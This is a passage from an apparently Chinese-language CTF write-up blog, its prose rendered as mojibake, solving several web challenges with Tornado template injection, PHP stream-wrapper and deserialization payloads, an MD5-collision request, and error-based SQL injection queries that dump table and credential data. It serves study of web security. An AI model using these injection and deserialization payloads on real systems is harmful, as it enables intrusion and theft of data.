</span></span></code></pre></div><p>ç°åœ¨å·²ç»æ²¡äº†ï¼Œæºç ä¸¢å¤±ä¸æ–¹ä¾¿å†™ï¼Œåº”è¯¥å°±æ˜¯æ­£å¸¸çš„cookieæ±¡æŸ“</p><h3 id=è§£é¢˜3-2>è§£é¢˜3</h3><p>unicodeè¿›è¡Œè§£é¢˜</p><p>unicodeä¼ªé€ adminè¿›è¡Œç™»å…¥æ”¹å¯†ç ç„¶åå†è¿›å…¥è¿›è¡Œä¼ªé€ </p><h2 id=mrctf2020ä½ ä¼ ä½ å‘¢>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>åˆ©ç”¨<code>.htaccess</code>ä¼ªé€ å›¾ç‰‡é©¬ä¼ å…¥ï¼Œèšå‰‘è¿</p><h2 id=æŠ¤ç½‘æ¯-2018easy_tornado>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p><code>hints.txt</code>å†…å®¹</p><pre tabindex=0><code>md5(cookie_secret+md5(filename))
</code></pre><pre tabindex=0><code>md5(cookie_secret+md5(fllllllllllllag))
</code></pre><p>å¦‚é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/error?msg<span style=color:#f92672>={{</span>handler.settings<span style=color:#f92672>}}</span>
</span></span></code></pre></div><p>å¾—åˆ°</p><pre tabindex=0><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;11e71ec2-6ea2-47d0-b195-23bca3c02b8f&#39;}
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>inner_string <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/fllllllllllllag&#34;</span>
</span></span><span style=display:flex><span>cookie_secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;11e71ec2-6ea2-47d0-b195-23bca3c02b8f&#34;</span>
</span></span><span style=display:flex><span>inner_md5 <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(inner_string<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>concatenated_string <span style=color:#f92672>=</span> cookie_secret <span style=color:#f92672>+</span> inner_md5
</span></span><span style=display:flex><span>outer_md5 <span style=color:#f92672>=</span> hashlib<span style=color:#f92672>.</span>md5(concatenated_string<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>print(outer_md5)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/file?filename<span style=color:#f92672>=</span>/fllllllllllllag&amp;filehash<span style=color:#f92672>=</span>bd9d4433dc3382c948d7dbc0a2a4ee79
</span></span></code></pre></div><p>è¿™é‡Œçš„ç–‘ç‚¹æ˜¯ä¸ºä»€ä¹ˆç”¨msgè¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œç½‘ä¸Šå¥½åƒæ²¡æœ‰è§£æã€‚</p><h2 id=zjctf-2019nizhuansiwei>[ZJCTF 2019]NiZhuanSiWei</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  
</span></span><span style=display:flex><span>$text <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;text&#34;</span>];
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;file&#34;</span>];
</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;password&#34;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($text)<span style=color:#f92672>&amp;&amp;</span>(<span style=color:#a6e22e>file_get_contents</span>($text,<span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>===</span><span style=color:#e6db74>&#34;welcome to the zjctf&#34;</span>)){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&lt;h1&gt;&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>file_get_contents</span>($text,<span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/h1&gt;&lt;/br&gt;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/&#34;</span>,$file)){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Not now!&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>(); 
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>include</span>($file);  <span style=color:#75715e>//useless.php
</span></span></span><span style=display:flex><span>        $password <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($password);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $password;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><pre tabindex=0><code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Flag</span>{  <span style=color:#75715e>//flag.php  
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $file;  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__tostring</span>(){  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>)){  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>); 
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;U R SO CLOSE !///COME ON PLZ&#34;</span>);
</span></span><span style=display:flex><span>        }  
</span></span><span style=display:flex><span>    }  
</span></span><span style=display:flex><span>}  
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>  
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Flag</span>{  <span style=color:#75715e>//flag.php
</span></span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__tostring</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>)){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> (<span style=color:#e6db74>&#34;U R SO CLOSE !///COME ON PLZ&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Flag</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>serialize</span>($exp);
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?text<span style=color:#f92672>=</span>data://text/plain,welcome to the zjctf&amp;file<span style=color:#f92672>=</span>useless.php&amp;password<span style=color:#f92672>=</span>O:4:<span style=color:#e6db74>&#34;Flag&#34;</span>:1:<span style=color:#f92672>{</span>s:4:<span style=color:#e6db74>&#34;file&#34;</span>;s:8:<span style=color:#e6db74>&#34;flag.php&#34;</span>;<span style=color:#f92672>}</span>;
</span></span></code></pre></div><h2 id=mrctf2020ez_bypass>[MRCTF2020]Ez_bypass</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>I</span> <span style=color:#a6e22e>put</span> <span style=color:#a6e22e>something</span> <span style=color:#a6e22e>in</span> <span style=color:#a6e22e>F12</span> <span style=color:#66d9ef>for</span> <span style=color:#a6e22e>you</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>$flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;gg&#39;</span>])<span style=color:#f92672>&amp;&amp;</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;id&#39;</span>])) {
</span></span><span style=display:flex><span>    $id<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;id&#39;</span>];
</span></span><span style=display:flex><span>    $gg<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;gg&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>md5</span>($id) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($gg) <span style=color:#f92672>&amp;&amp;</span> $id <span style=color:#f92672>!==</span> $gg) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;You got the first step&#39;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>])) {
</span></span><span style=display:flex><span>            $passwd<span style=color:#f92672>=</span>$_POST[<span style=color:#e6db74>&#39;passwd&#39;</span>];
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>is_numeric</span>($passwd))
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                 <span style=color:#66d9ef>if</span>($passwd<span style=color:#f92672>==</span><span style=color:#ae81ff>1234567</span>)
</span></span><span style=display:flex><span>                 {
</span></span><span style=display:flex><span>                     <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Good Job!&#39;</span>;
</span></span><span style=display:flex><span>                     <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#39;flag.php&#39;</span>);
</span></span><span style=display:flex><span>                     <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;By Retr_0&#39;</span>);
</span></span><span style=display:flex><span>                 }
</span></span><span style=display:flex><span>                 <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                 {
</span></span><span style=display:flex><span>                     <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;can you think twice??&#34;</span>;
</span></span><span style=display:flex><span>                 }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;You can not get it !&#39;</span>;
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;only one way to get the flag&#39;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;You are not a real hacker!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Please input first&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}<span style=color:#a6e22e>Please</span> <span style=color:#a6e22e>input</span> <span style=color:#a6e22e>first</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /?id<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;gg<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 HTTP/1.1
</span></span><span style=display:flex><span>Host: db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Referer: http://db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81/?id<span style=color:#f92672>=</span>240610708&amp;gg<span style=color:#f92672>=</span>QNKCDZO
</span></span><span style=display:flex><span>Origin: http://db1beab5-a17a-48a8-8335-aa8982457f65.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>17</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>passwd<span style=color:#f92672>=</span>1234567abc
</span></span></code></pre></div><h2 id=æå®¢å¤§æŒ‘æˆ˜-2019hardsql>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#39;</span>geek<span style=color:#e6db74>&#39;)),0x7e),1))#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;</span>H4rDsq1<span style=color:#e6db74>&#39;)),0x7e),1))#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;or(updatexml(1,concat(0x7e,(select(group_concat(id,&#39;</span><span style=color:#f92672>~</span><span style=color:#e6db74>&#39;,username,&#39;</span><span style=color:#f92672>~</span><span style=color:#e6db74>&#39;,password))from(H4rDsq1)),0x7e),1))#
</span></span></span></code></pre></div><p>æ‹¿åˆ°ä¸€åŠçš„flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#
</span></span></span></code></pre></div><h2 id=ç½‘é¼æ¯-2020-é’é¾™ç»„areuserialz>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span>(<span style=color:#e6db74>&#34;flag.php&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FileHandler</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $op;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $filename;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $content;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>() {
</span></span><span style=display:flex><span>        $op <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
</span></span><span style=display:flex><span>        $filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/tmp/tmpfile&#34;</span>;
</span></span><span style=display:flex><span>        $content <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Hello World!&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>process</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;1&#34;</span>) {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>write</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;2&#34;</span>) {
</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>read</span>();
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>($res);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Bad Hacker!&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>((<span style=color:#a6e22e>string</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>) {
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Too long!&#34;</span>);
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_put_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span>($res) $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Successful!&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>output</span>(<span style=color:#e6db74>&#34;Failed!&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>() {
</span></span><span style=display:flex><span>        $res <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>)) {
</span></span><span style=display:flex><span>            $res <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>filename</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $res;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>output</span>($s) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;[Result]: &lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $s;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;2&#34;</span>)
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>op</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>content</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>process</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>is_valid</span>($s) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>strlen</span>($s); $i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>(<span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>ord</span>($s[$i]) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>125</span>))
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET{<span style=color:#e6db74>&#39;str&#39;</span>})) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $str <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_GET[<span style=color:#e6db74>&#39;str&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_valid</span>($str)) {
</span></span><span style=display:flex><span>        $obj <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($str);
</span></span><span style=display:flex><span>    }
